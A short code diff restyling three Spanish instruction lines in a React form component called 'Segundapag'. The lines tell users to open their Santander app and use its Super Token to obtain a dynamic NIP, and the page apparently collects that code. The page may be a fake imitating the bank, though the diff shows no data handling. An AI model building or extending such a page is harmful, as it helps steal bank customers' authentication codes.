@@ -75,9 +75,9 @@ function Segundapag() {
           Si tienes problemas para obtener el NIP, por favor contacta a soporte técnico.
         </p>
         <div className="instructions">
-          <p>1. Abre tu aplicación Santander.</p>
-          <p>2. En la parte de abajo selecciona la opción "Super Token".</p>
-          <p>3. Ingresa tu clave de Super Token para obtener el NIP dinámico.</p>
+          <p style={{ fontSize: '12px', color: '#555' }}>1. Abre tu aplicación Santander.</p>
+<p style={{ fontSize: '12px', color: '#555' }}>2. En la parte de abajo selecciona la opción "Super Token".</p>
+<p style={{ fontSize: '12px', color: '#555' }}>3. Ingresa tu clave de Super Token para obtener el NIP dinámico.</p>
         </div>
       </form>
     </div>
